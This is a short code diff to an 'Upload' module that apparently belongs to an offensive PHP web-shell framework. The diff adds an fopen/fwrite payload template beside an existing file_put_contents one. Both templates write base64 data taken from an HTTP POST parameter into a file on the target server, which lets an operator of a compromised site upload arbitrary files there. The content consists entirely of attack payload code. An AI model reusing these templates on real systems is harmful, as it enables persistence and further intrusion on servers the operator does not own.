@@ -19,7 +19,8 @@ class Upload(Module):
     
     
     vectors = { 'shell.php' : { 
-                               'file_put_contents' : 'file_put_contents("%s", base64_decode($_POST["%s"]));'
+                               'file_put_contents' : 'file_put_contents("%s", base64_decode($_POST["%s"]));',
+                               'fwrite' : '$h = fopen("%s", "w"); fwrite($h, base64_decode($_POST["%s"]));'
                                }
                }
     
